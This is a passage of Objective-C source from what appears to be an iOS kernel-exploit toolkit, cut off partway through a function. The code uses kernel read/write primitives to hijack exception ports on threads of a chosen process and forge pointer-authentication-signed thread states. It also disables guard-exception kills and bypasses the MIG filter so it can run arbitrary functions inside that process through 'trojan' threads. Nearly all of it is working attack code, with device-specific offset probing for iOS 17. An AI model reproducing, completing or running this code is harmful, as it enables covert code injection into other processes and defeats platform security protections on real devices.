#import <Foundation/Foundation.h>
#import <mach/mach.h>
#import <dlfcn.h>
#import <pthread.h>
#import <stdint.h>
#import <sys/mman.h>

#import "RemoteCall.h"
#import "VM.h"
#import "Exception.h"
#import "PAC.h"
#import "Thread.h"
#import "MigFilterBypassThread.h"

#import "../kexploit/kcompat.h"
#import "../kexploit/rc_offsets.h"
#import "../kexploit/rc_kutils.h"
#import "../kexploit/darksword.h"

// xnu exc_guard.h (LightSaber-inspired enhanced handling)
#define EXC_GUARD_ENCODE_TYPE(code, type) \
    ((code) |= (((uint64_t)(type) & 0x7ull) << 61))
#define EXC_GUARD_ENCODE_FLAVOR(code, flavor) \
    ((code) |= (((uint64_t)(flavor) & 0x1fffffffull) << 32))
#define EXC_GUARD_ENCODE_TARGET(code, target) \
    ((code) |= (((uint64_t)(target) & 0xffffffffull)))

// mach/exc_guard.h
#ifndef GUARD_TYPE_MACH_PORT
#define GUARD_TYPE_MACH_PORT    1
#endif
#define kGUARD_EXC_INVALID_RIGHT 1

// Enhanced EXC_GUARD decode macros (LightSaber-inspired)
#define EXC_GUARD_DECODE_TYPE(code)    (((code) >> 61) & 0x7ull)
#define EXC_GUARD_DECODE_FLAVOR(code)  (((code) >> 32) & 0x1fffffffull)
#define EXC_GUARD_DECODE_TARGET(code)  ((code) & 0xffffffffull)

// EXC_GUARD flavor constants
#define kGUARD_EXC_DESTROY       1
#define kGUARD_EXC_REARM         2
#define kGUARD_EXC_GUARD         8

// arm_thread_state64 flags
#define __DARWIN_ARM_THREAD_STATE64_USER_DIVERSIFIER_MASK  0xff000000
#define __DARWIN_ARM_THREAD_STATE64_FLAGS_IB_SIGNED_LR     0x2
#define __DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_PC 0x4
#define __DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_LR 0x8

// fake PC/LR sentinel values (from pe_main.js)
#define SHMEM_CACHE_SIZE        100
#define FAKE_PC_TROJAN_CREATOR  0x101
#define FAKE_LR_TROJAN_CREATOR  0x201
#define FAKE_PC_TROJAN          0x301
#define FAKE_LR_TROJAN          0x401

#define BREAKPOINT_ENABLE  481
#define BREAKPOINT_DISABLE 0

// в”Ђв”Ђ globals в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ

uint64_t  g_RC_taskAddr;
bool      g_RC_creatingExtraThread;
mach_port_t g_RC_firstExceptionPort;
mach_port_t g_RC_secondExceptionPort;
uint64_t  g_RC_firstExceptionPortAddr;
uint64_t  g_RC_secondExceptionPortAddr;
pthread_t g_RC_dummyThread;
mach_port_t g_RC_dummyThreadMach;
uint64_t  g_RC_dummyThreadAddr;
uint64_t  g_RC_dummyThreadTro;
uint64_t  g_RC_selfThreadAddr;
uint32_t  g_RC_selfThreadCtid;
arm_thread_state64_internal g_RC_originalState;
uint64_t  g_RC_vmMap;
uint64_t  g_RC_callThreadAddr;
uint64_t  g_RC_trojanThreadAddr;
int       g_RC_pid;
bool      g_RC_success = true;
uint64_t  g_RC_gadgetPacia = 0;
uint64_t  g_RC_dyldSignPointer = 0;  // dyld::signPointer fallback (LightSaber)

NSMutableArray<NSNumber *> *g_RC_threadList = nil;
uint64_t  g_RC_trojanMem = 0;
struct VMShmem g_RC_shmemCache[SHMEM_CACHE_SIZE];

// Р”Р»СЏ UI fallback: РєРѕР»РёС‡РµСЃС‚РІРѕ РІР°Р»РёРґРЅС‹С… РїРѕС‚РѕРєРѕРІ, РЅР°Р№РґРµРЅРЅС‹С… РґР»СЏ remote call
__attribute__((visibility("default"))) int g_RC_validThreadCount = 0;

// в”Ђв”Ђ Enhanced EXC_GUARD analysis (LightSaber-inspired) в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ

static void analyze_exc_guard_code(mach_exception_code_t code)
{
    uint64_t type = EXC_GUARD_DECODE_TYPE(code);
    uint64_t flavor = EXC_GUARD_DECODE_FLAVOR(code);
    uint64_t target = EXC_GUARD_DECODE_TARGET(code);

    const char *typeStr = "unknown";
    if (type == 1) typeStr = "mach_port";
    else if (type == 2) typeStr = "fileport";

    const char *flavorStr = "unknown";
    if (flavor == kGUARD_EXC_DESTROY) flavorStr = "destroy";
    else if (flavor == kGUARD_EXC_REARM) flavorStr = "rearm";
    else if (flavor == kGUARD_EXC_GUARD) flavorStr = "guard_violation";
    else if (flavor == kGUARD_EXC_INVALID_RIGHT) flavorStr = "invalid_right";

    printf("[EXC_GUARD] type=%s(%llu) flavor=%s(%llu) target=0x%llx\n",
           typeStr, type, flavorStr, flavor, (unsigned long long)target);
}

// в”Ђв”Ђ helper: set exception port on a target thread в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ

static bool set_exception_port_on_thread(mach_port_t exceptionPort,
                                         uint64_t currThread,
                                         bool useMigFilterBypass)
{
    bool success = false;

    void *thread_set_exception_ports_addr = dlsym(RTLD_DEFAULT, "thread_set_exception_ports");
    void *pthread_exit_addr               = dlsym(RTLD_DEFAULT, "pthread_exit");

    pthread_t pthr = NULL;
    pthread_create_suspended_np(&pthr, NULL,
        (void *(*)(void *))thread_set_exception_ports_addr, NULL);

    mach_port_t machThread    = pthread_mach_thread_np(pthr);
    uint64_t    machThreadAddr = task_get_ipc_port_kobject(task_self_kptr(), machThread);

    if (useMigFilterBypass)
        mig_bypass_monitor_threads(g_RC_selfThreadAddr, machThreadAddr);

    arm_thread_state64_internal state;
    memset(&state, 0, sizeof(state));
    mach_msg_type_number_t count = ARM_THREAD_STATE64_COUNT;
    thread_get_state(machThread, ARM_THREAD_STATE64, (thread_state_t)&state, &count);

    uint64_t diver = (uint64_t)state.__flags & __DARWIN_ARM_THREAD_STATE64_USER_DIVERSIFIER_MASK;

    arm_thread_state64_set_pc_fptr(state, thread_set_exception_ports_addr);
    arm_thread_state64_set_lr_fptr(state, pthread_exit_addr);

    state.__x[0] = g_RC_dummyThreadMach;
    state.__x[1] = EXC_MASK_GUARD | EXC_MASK_BAD_ACCESS;
    state.__x[2] = exceptionPort;
    state.__x[3] = EXCEPTION_STATE | MACH_EXCEPTION_CODES;
    state.__x[4] = ARM_THREAD_STATE64;

    sign_state(machThreadAddr, &state,
               (uint64_t)thread_set_exception_ports_addr,
               (uint64_t)pthread_exit_addr);

    // write ctid so the kernel treats this as the currThread's mutex holder
    uint32_t prevMutex = thread_get_mutex(currThread);
    thread_set_mutex(machThreadAddr, 0x40000000);
    kwrite32(currThread + rc_off_thread_ctid,
             kread32(machThreadAddr + rc_off_thread_ctid));

    if (thread_set_state_wrapper(machThread, machThreadAddr, &state) &&
        thread_resume_wrapper(machThread)) {
        success = true;
    }

    thread_set_mutex(currThread, prevMutex);
    thread_set_mutex(machThreadAddr, 0x40000000);
    thread_set_exception_ports(g_RC_dummyThreadMach, 0, exceptionPort,
                               EXCEPTION_STATE | MACH_EXCEPTION_CODES,
                               ARM_THREAD_STATE64);

    // Give machThread enough time to execute thread_set_exception_ports
    // in kernel space before we continue and trigger exceptions.
    usleep(100000);

    return success;
}

// в”Ђв”Ђ sign_state в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ

void sign_state(uint64_t signingThread, arm_thread_state64_internal *state,
                uint64_t pc, uint64_t lr)
{
    if (gIsPACSupported) {
        uint64_t diver   = (uint64_t)state->__flags & __DARWIN_ARM_THREAD_STATE64_USER_DIVERSIFIER_MASK;
        uint64_t discPC  = ptrauth_blend_discriminator_wrapper(diver, ptrauth_string_discriminator_special("pc"));
        uint64_t discLR  = ptrauth_blend_discriminator_wrapper(diver, ptrauth_string_discriminator_special("lr"));

        if (pc) {
            uint32_t flags = state->__flags;
            flags &= ~__DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_PC;
            state->__flags = flags;
            state->__pc    = remote_pac(signingThread, pc, discPC);
        }
        if (lr) {
            uint32_t flags = state->__flags;
            flags &= ~(__DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_LR |
                       __DARWIN_ARM_THREAD_STATE64_FLAGS_IB_SIGNED_LR);
            state->__flags = flags;
            state->__lr    = remote_pac(signingThread, lr, discLR);
        }
        return;
    }

    if (!gIsPACSupported) {
        if (pc) state->__pc = pc;
        if (lr) state->__lr = lr;
    }
}

// в”Ђв”Ђ do_remote_call_temp (single-use trojan thread) в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ

uint64_t do_remote_call_temp(int timeout, const char *name,
    uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3,
    uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7)
{
    int newTimeout = (timeout < 10000) ? 10000 : timeout;
    uint64_t pcAddr = native_strip((uint64_t)dlsym(RTLD_DEFAULT, name));

    ExceptionMessage exc;
    if (!wait_exception(g_RC_firstExceptionPort, &exc, newTimeout, false)) {
        printf("[%s:%d] Don't receive first exception on original thread\n",
               __FUNCTION__, __LINE__);
        return 0;
    }

    exc.threadState.__x[0] = x0;
    exc.threadState.__x[1] = x1;
    exc.threadState.__x[2] = x2;
    exc.threadState.__x[3] = x3;
    exc.threadState.__x[4] = x4;
    exc.threadState.__x[5] = x5;
    exc.threadState.__x[6] = x6;
    exc.threadState.__x[7] = x7;

    sign_state(g_RC_trojanThreadAddr, &exc.threadState, pcAddr, FAKE_LR_TROJAN);
    reply_with_state(&exc, &exc.threadState);

    ExceptionMessage retExc;
    if (!wait_exception(g_RC_firstExceptionPort, &retExc, newTimeout, false)) {
        printf("[%s:%d] Don't receive return exception\n", __FUNCTION__, __LINE__);
        return 0;
    }

    uint64_t retValue = retExc.threadState.__x[0];
    sign_state(g_RC_trojanThreadAddr, &retExc.threadState, FAKE_PC_TROJAN, FAKE_LR_TROJAN);
    reply_with_state(&retExc, &retExc.threadState);

    if (strcmp(name, "getpid") == 0 && retValue == 0) {
        printf("[%s:%d] getpid returned 0 вЂ” state may be corrupted, spinning\n",
               __FUNCTION__, __LINE__);
        while (1) {};
    }
    return retValue;
}

// в”Ђв”Ђ do_remote_call_stable (extra-thread path) в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ

uint64_t do_remote_call_stable(int timeout, const char *name,
    uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3,
    uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7)
{
    if (!g_RC_creatingExtraThread)
        return do_remote_call_temp(timeout, name, x0, x1, x2, x3, x4, x5, x6, x7);

    uint64_t pcAddr = (uint64_t)dlsym(RTLD_DEFAULT, name);
    if (!pcAddr) {
        printf("[%s:%d] dlsym '%s' failed\n", __FUNCTION__, __LINE__, name);
        return 0;
    }

    ExceptionMessage exc;
    if (!wait_exception(g_RC_secondExceptionPort, &exc, timeout > 0 ? timeout : 10000, false)) {
        printf("[%s:%d] wait_exception (stable) failed for '%s'\n",
               __FUNCTION__, __LINE__, name);
        return 0;
    }

    exc.threadState.__x[0] = x0;
    exc.threadState.__x[1] = x1;
    exc.threadState.__x[2] = x2;
    exc.threadState.__x[3] = x3;
    exc.threadState.__x[4] = x4;
    exc.threadState.__x[5] = x5;
    exc.threadState.__x[6] = x6;
    exc.threadState.__x[7] = x7;

    sign_state(g_RC_callThreadAddr, &exc.threadState, pcAddr, FAKE_LR_TROJAN);
    reply_with_state(&exc, &exc.threadState);

    ExceptionMessage retExc;
    if (!wait_exception(g_RC_secondExceptionPort, &retExc, timeout > 0 ? timeout : 10000, false)) {
        printf("[%s:%d] wait_exception (stable return) failed for '%s'\n",
               __FUNCTION__, __LINE__, name);
        return 0;
    }

    uint64_t retValue = retExc.threadState.__x[0];
    sign_state(g_RC_callThreadAddr, &retExc.threadState, FAKE_PC_TROJAN, FAKE_LR_TROJAN);
    reply_with_state(&retExc, &retExc.threadState);
    return retValue;
}

// в”Ђв”Ђ restore_trojan_thread в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ

static bool restore_trojan_thread(arm_thread_state64_internal *state)
{
    ExceptionMessage exc;
    if (!wait_exception(g_RC_firstExceptionPort, &exc, 20000, false)) {
        printf("[%s:%d] Failed to receive exception while restoring\n",
               __FUNCTION__, __LINE__);
        return false;
    }

    state->__flags = exc.threadState.__flags;
    sign_state(g_RC_trojanThreadAddr, state, state->__pc, state->__lr);
    reply_with_state(&exc, state);
    return true;
}

// в”Ђв”Ђ destroy_remote_call в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ

int destroy_remote_call(void)
{
    if (g_RC_trojanMem) {
        do_remote_call_stable(100, "munmap", g_RC_trojanMem, PAGE_SIZE, 0, 0, 0, 0, 0, 0);
    }
    if (g_RC_creatingExtraThread) {
        do_remote_call_stable(-1, "pthread_exit", 0, 0, 0, 0, 0, 0, 0, 0);
    } else {
        restore_trojan_thread(&g_RC_originalState);
    }

    mach_port_destruct(mach_task_self_, g_RC_firstExceptionPort, 0, 0);
    mach_port_destruct(mach_task_self_, g_RC_secondExceptionPort, 0, 0);
    pthread_cancel(g_RC_dummyThread);

    g_RC_threadList = [NSMutableArray new];
    return 0;
}

// в”Ђв”Ђ VMShmem cache в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ

static struct VMShmem *get_shmem_from_cache(uint64_t pageAddr)
{
    for (int i = 0; i < SHMEM_CACHE_SIZE; i++) {
        if (g_RC_shmemCache[i].used && g_RC_shmemCache[i].remoteAddress == pageAddr)
            return &g_RC_shmemCache[i];
    }
    return NULL;
}

static struct VMShmem *put_shmem_in_cache(struct VMShmem *shmem)
{
    for (int i = 0; i < SHMEM_CACHE_SIZE; i++) {
        if (!g_RC_shmemCache[i].used) {
            g_RC_shmemCache[i] = *shmem;
            g_RC_shmemCache[i].used = true;
            return &g_RC_shmemCache[i];
        }
    }
    printf("[%s:%d] g_RC_shmemCache full\n", __FUNCTION__, __LINE__);
    return NULL;
}

static struct VMShmem *get_shmem_for_page(uint64_t pageAddr)
{
    struct VMShmem *cached = get_shmem_from_cache(pageAddr);
    if (cached) return cached;

    struct VMShmem newShmem = vm_map_remote_page(g_RC_vmMap, pageAddr);
    if (!newShmem.localAddress)
        return NULL;
    return put_shmem_in_cache(&newShmem);
}

// в”Ђв”Ђ remote read / write в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ

bool remote_read(uint64_t src, void *dst, uint64_t size)
{
    if (!src || !dst || !size) return false;
    uint64_t dstAddr = (uint64_t)(uintptr_t)dst;
    uint64_t until   = src + size;

    while (src < until) {
        uint64_t remaining = until - src;
        uint64_t offs      = src & (PAGE_SIZE - 1);
        uint64_t roundUp   = (src + PAGE_SIZE) & ~(PAGE_SIZE - 1);
        uint64_t copyCount = (roundUp - src < remaining) ? (roundUp - src) : remaining;
        uint64_t pageAddr  = src & ~(uint64_t)(PAGE_SIZE - 1);

        struct VMShmem *page = get_shmem_for_page(pageAddr);
        if (!page) {
            printf("[%s:%d] remote_read: no shmem for 0x%llx\n",
                   __FUNCTION__, __LINE__, (unsigned long long)pageAddr);
            return false;
        }
        memcpy((void *)(uintptr_t)dstAddr,
               (void *)(uintptr_t)(page->localAddress + offs),
               (size_t)copyCount);
        src     += copyCount;
        dstAddr += copyCount;
    }
    return true;
}

uint64_t remote_read64(uint64_t src)
{
    uint64_t val = 0;
    remote_read(src, &val, sizeof(val));
    return val;
}

bool remote_write(uint64_t dst, const void *src, uint64_t size)
{
    if (!dst || !src || !size) return false;
    uint64_t srcAddr = (uint64_t)(uintptr_t)src;
    uint64_t until   = dst + size;

    while (dst < until) {
        uint64_t remaining = until - dst;
        uint64_t offs      = dst & (PAGE_SIZE - 1);
        uint64_t roundUp   = (dst + PAGE_SIZE) & ~(PAGE_SIZE - 1);
        uint64_t copyCount = (roundUp - dst < remaining) ? (roundUp - dst) : remaining;
        uint64_t pageAddr  = dst & ~(uint64_t)(PAGE_SIZE - 1);

        struct VMShmem *page = get_shmem_for_page(pageAddr);
        if (!page) {
            printf("[%s:%d] remote_write: no shmem for 0x%llx\n",
                   __FUNCTION__, __LINE__, (unsigned long long)pageAddr);
            return false;
        }
        memcpy((void *)(uintptr_t)(page->localAddress + offs),
               (const void *)(uintptr_t)srcAddr,
               (size_t)copyCount);
        dst     += copyCount;
        srcAddr += copyCount;
    }
    return true;
}

bool remote_write64(uint64_t dst, uint64_t val)
{
    return remote_write(dst, &val, sizeof(val));
}

bool remote_writeStr(uint64_t dst, const char *str)
{
    return remote_write(dst, str, strlen(str) + 1);
}

void remote_hexdump(uint64_t remoteAddr, size_t size)
{
    uint8_t *buf = malloc(size);
    if (!buf) return;
    if (remote_read(remoteAddr, buf, size)) {
        for (size_t i = 0; i < size; i++) {
            if (i % 16 == 0) printf("\n0x%llx: ", (unsigned long long)(remoteAddr + i));
            printf("%02x ", buf[i]);
        }
        printf("\n");
    }
    free(buf);
}

// в”Ђв”Ђ retry_first_thread в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ

static uint64_t retry_first_thread(bool useMigFilterBypass)
{
    pthread_t newDummy = NULL;
    void *dummyFunc = dlsym(RTLD_DEFAULT, "getpid");
    pthread_create_suspended_np(&newDummy, NULL, (void *(*)(void *))dummyFunc, NULL);
    mach_port_t  newDummyMach = pthread_mach_thread_np(newDummy);
    uint64_t     newDummyAddr = task_get_ipc_port_kobject(task_self_kptr(), newDummyMach);
    uint64_t     newDummyTro  = kread64(newDummyAddr + rc_off_thread_t_tro);

    if (g_RC_dummyThreadAddr && newDummyTro >= 0xFFFFFF8000000000ULL) {
        kwrite64(g_RC_dummyThreadAddr + rc_off_thread_t_tro, newDummyTro);
    }

    g_RC_dummyThread     = newDummy;
    g_RC_dummyThreadMach = newDummyMach;
    g_RC_dummyThreadAddr = newDummyAddr;
    g_RC_dummyThreadTro  = newDummyTro;

    uint64_t firstThread = newDummyAddr;
    if (useMigFilterBypass)
        mig_bypass_resume();

    set_exception_port_on_thread(g_RC_firstExceptionPort, firstThread, useMigFilterBypass);
    return firstThread;
}

// в”Ђв”Ђ init_remote_call в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ

int init_remote_call(const char *process, bool useMigFilterBypass)
{
    memset(g_RC_shmemCache, 0, sizeof(g_RC_shmemCache));
    g_RC_creatingExtraThread = false;
    g_RC_trojanMem           = 0;
    g_RC_success             = true;

    uint64_t procAddr = proc_find_by_name(process);
    if (!procAddr) {
        printf("[%s:%d] proc_find '%s' failed\n", __FUNCTION__, __LINE__, process);
        return -1;
    }

    g_RC_taskAddr = proc_task(procAddr);

    mach_port_t firstExceptionPort  = create_exception_port();
    mach_port_t secondExceptionPort = create_exception_port();

    if (!firstExceptionPort || !secondExceptionPort) {
        printf("[%s:%d] Couldn't create exception ports\n", __FUNCTION__, __LINE__);
        mach_port_destruct(mach_task_self_, firstExceptionPort, 0, 0);
        mach_port_destruct(mach_task_self_, secondExceptionPort, 0, 0);
        return -1;
    }

    disable_excguard_kill(g_RC_taskAddr);

    mach_exception_code_t guardCode = 0;
    EXC_GUARD_ENCODE_TYPE(guardCode, GUARD_TYPE_MACH_PORT);
    EXC_GUARD_ENCODE_FLAVOR(guardCode, kGUARD_EXC_INVALID_RIGHT);
    EXC_GUARD_ENCODE_TARGET(guardCode, 0xf503ULL);

    uint64_t firstPortAddr  = task_get_ipc_port_kobject(task_self_kptr(), firstExceptionPort);
    uint64_t secondPortAddr = task_get_ipc_port_kobject(task_self_kptr(), secondExceptionPort);

    pthread_t   dummyThread = NULL;
    void       *dummyFunc   = dlsym(RTLD_DEFAULT, "getpid");
    pthread_create_suspended_np(&dummyThread, NULL, (void *(*)(void *))dummyFunc, NULL);
    mach_port_t dummyThreadMach = pthread_mach_thread_np(dummyThread);
    uint64_t    dummyThreadAddr = task_get_ipc_port_kobject(task_self_kptr(), dummyThreadMach);

    // в”Ђв”Ђ Runtime TRO offset probe в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
    // Run BEFORE reading dummyThreadTro so we use the corrected offset.
    // rc_probe_tro_offset scans our own dummy thread for the real t_tro offset
    // and adjusts rc_off_thread_t_tro + all derived offsets (task_threads_next,
    // ctid, ast, mutex, guard_exc_info).  Critical on A12X iOS 17.x where the
    // CPUFAMILY is identical to A12 but the struct layout may differ.
    printf("[%s:%d] probing TRO offset on dummy thread 0x%llx (proc='%s')\n",
           __FUNCTION__, __LINE__, (unsigned long long)dummyThreadAddr, process);
    bool probeOK = rc_probe_tro_offset(dummyThreadAddr);
    if (!probeOK) {
        printf("[%s:%d] WARNING: TRO probe failed on dummy thread вЂ” using static offsets (tro=0x%x)\n",
               __FUNCTION__, __LINE__, rc_off_thread_t_tro);
    }

    uint64_t    dummyThreadTro  = kread64(dummyThreadAddr + rc_off_thread_t_tro);
    mach_port_t threadSelf      = mach_thread_self();
    uint64_t    selfThreadAddr  = task_get_ipc_port_kobject(task_self_kptr(), threadSelf);
    uint32_t    selfThreadCtid  = kread32(selfThreadAddr + rc_off_thread_ctid);

    // Diagnostic: log task address and first chain entry BEFORE the walk
    printf("[%s:%d] target proc='%s' addr=0x%llx taskAddr=0x%llx\n",
           __FUNCTION__, __LINE__, process,
           (unsigned long long)procAddr,
           (unsigned long long)g_RC_taskAddr);
    {
        uint64_t _diag_sentinel = g_RC_taskAddr + rc_off_task_threads_next;
        uint64_t _diag_chain    = kread64(_diag_sentinel);
        printf("[%s:%d] sentinel=0x%llx first_chain=0x%llx (rc_off_task_threads_next=0x%x)\n",
               __FUNCTION__, __LINE__,
               (unsigned long long)_diag_sentinel,
               (unsigned long long)_diag_chain,
               rc_off_task_threads_next);
        if (_diag_chain >= 0xFFFFFF8000000000ULL) {
            uint64_t _diag_thread = _diag_chain - rc_off_thread_task_threads_next;
            uint64_t _diag_tro    = kread64(_diag_thread + rc_off_thread_t_tro);
            printf("[%s:%d] first_thread=0x%llx first_tro=0x%llx (rc_off_task_threads_next=0x%x tro_off=0x%x)\n",
                   __FUNCTION__, __LINE__,
                   (unsigned long long)_diag_thread,
                   (unsigned long long)_diag_tro,
                   rc_off_thread_task_threads_next,
                   rc_off_thread_t_tro);
        } else {
            printf("[%s:%d] WARNING: first_chain is not a kernel pointer вЂ” check g_RC_taskAddr and rc_off_task_threads_next\n",
                   __FUNCTION__, __LINE__);
        }
    }

    g_RC_creatingExtraThread    = true;
    g_RC_firstExceptionPort     = firstExceptionPort;
    g_RC_secondExceptionPort    = secondExceptionPort;
    g_RC_firstExceptionPortAddr = firstPortAddr;
    g_RC_secondExceptionPortAddr= secondPortAddr;
    g_RC_dummyThread            = dummyThread;
    g_RC_dummyThreadMach        = dummyThreadMach;
    g_RC_dummyThreadAddr        = dummyThreadAddr;
    g_RC_dummyThreadTro         = dummyThreadTro;
    g_RC_selfThreadAddr         = selfThreadAddr;
    g_RC_selfThreadCtid         = selfThreadCtid;

    g_RC_threadList = [NSMutableArray new];

    int retryCount         = 0;
    int validThreadCount   = 0;
    int successThreadCount = 0;
    // Hard cap: prevents infinite loop when rc_off_thread_task_threads_next is
    // wrong and the chain cycles without ever returning to sentinel.
    int maxIter = 1024;

    if (useMigFilterBypass)
        mig_bypass_start();

    // в”Ђв”Ђ DEBUG: Test different task_threads_next offsets в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
    // On A12X iOS 17.3.1, rc_off_task_threads_next might be different from 0x58
    printf("[%s:%d] DEBUG: Testing task_threads_next offsets around 0x58\n", __FUNCTION__, __LINE__);
    uint32_t test_offsets[] = {0x48, 0x50, 0x58, 0x60, 0x68, 0x70};
    for (int i = 0; i < sizeof(test_offsets)/sizeof(test_offsets[0]); i++) {
        uint32_t test_off = test_offsets[i];
        uint64_t test_sentinel = g_RC_taskAddr + test_off;
        uint64_t test_chain = kread64(test_sentinel);
        printf("[%s:%d] task_threads_next=0x%x: sentinel=0x%llx chain=0x%llx\n",
               __FUNCTION__, __LINE__, test_off,
               (unsigned long long)test_sentinel,
               (unsigned long long)test_chain);
        if (_rc_is_kptr(test_chain)) {
            uint64_t test_thread = test_chain - rc_off_thread_task_threads_next;
            uint64_t test_tro = kread64(test_thread + rc_off_thread_t_tro);
            printf("[%s:%d]   -> thread=0x%llx tro=0x%llx (%s)\n",
                   __FUNCTION__, __LINE__,
